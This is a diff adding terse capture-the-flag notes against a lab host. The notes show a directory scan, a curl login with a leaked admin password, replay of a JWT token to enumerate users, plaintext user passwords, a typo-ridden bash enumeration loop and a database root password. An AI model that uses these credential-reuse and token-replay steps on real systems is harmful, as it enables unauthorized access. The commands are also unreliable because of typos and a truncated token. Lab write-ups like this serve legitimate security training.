@@ -1,0 +1,49 @@
+---- Scanning URL: http://10.10.10.137/ ----
+
+==> DIRECTORY: http://10.10.10.137/css/
+
++ http://10.10.10.137/index.html (CODE:200|SIZE:3138)
+
+==> DIRECTORY: http://10.10.10.137/js/
+
++ http://10.10.10.137/LICENSE (CODE:200|SIZE:1093)
+
++ http://10.10.10.137/management (CODE:401|SIZE:381)
+
+==> DIRECTORY: http://10.10.10.137/member/
+
+==> DIRECTORY: http://10.10.10.137/vendor/
+
+http://10.10.10.137/management 
+
+
+
+
+curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' http://10.10.10.137:3000/login
+
+
+and then we will get an auth token from here
+
+url -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNTAzOTU2LCJleHAiOjE1NjA1OTAzNTZ9.RWX1xIk-kw45lVkGi21SVP5ot-pHhXK6cjKHCmxG9aM" http://10.10.10.137:3000/users
+
+
+after this used same token for other users by adding user in users/
+
+Admin : WX5b7)>/rp$U)FW
+Derry: rZ86wwLvx7jUxtch
+Yuri : bet@tester87
+Dory : 5y:!xa=ybfe)/QD
+
+or create a file with users 
+Admin
+Derry
+Yuri
+Dory
+
+and then write shell script
+whiel read line; do curl --header "Autorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNTAzOTU2LCJleHAiOjE1NjA1OTAzNT whatver the token is" http://10.10.10.137:3000/users/$Line; done<usernames.txtt
+
+
+$dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg';
+
+login and find user flag in hone
